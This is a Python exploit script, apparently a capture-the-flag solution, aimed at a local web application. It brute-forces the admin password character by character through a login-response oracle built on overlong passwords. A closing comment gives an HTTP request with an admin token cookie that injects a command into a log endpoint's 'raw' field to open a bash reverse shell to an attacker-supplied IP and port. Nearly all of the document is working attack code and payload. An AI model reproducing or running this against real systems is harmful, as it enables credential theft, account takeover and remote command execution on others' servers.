import random
import string
from time import sleep

import requests

base = "http://127.0.0.1:1337/"

N = 10
ADMIN_PASSWORD = ""

while True:
    username = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
    password = "A" * (71 - len(ADMIN_PASSWORD)) + "PASSWORD"

    response = requests.post(base + "register",
                             {"username": username, "password": password})
    sleep(0.1)

    if response.ok:
        for i in string.printable:
            password = "A" * (71 - len(ADMIN_PASSWORD)) + ADMIN_PASSWORD + i
            response = requests.post(base + "login",
                                     data={"username": username, "password": password},
                                     allow_redirects=False)
            sleep(0.1)
            if response.headers["location"] == "/":
                print(f"Found character: |{i}|")
                ADMIN_PASSWORD += i
                break
            elif response.headers["location"] == "/login":
                continue
            else:
                raise Exception(":/")
        else:
            break
    print(f"Current ADMIN_PASSWORD: |{ADMIN_PASSWORD}|")

"""
After retrieving the admin password, we can log into the admin account and send a request to the /log api using burp for example

POST /log HTTP/1.1
Host: 127.0.0.1:1337
sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl90eXBlIjoiYWRtaW4iLCJleHAiOjEwMDAwMDAwMDAwfQ.hyTVjumA0RtlUYR662dE3eKEpS4J35_yaJIbfSMelQQ
Connection: close
Content-Length: 81

{"message": {"raw":";bash -c 'sh -i >& /dev/tcp/[ip]/[port] 0>&1;'"} }
"""
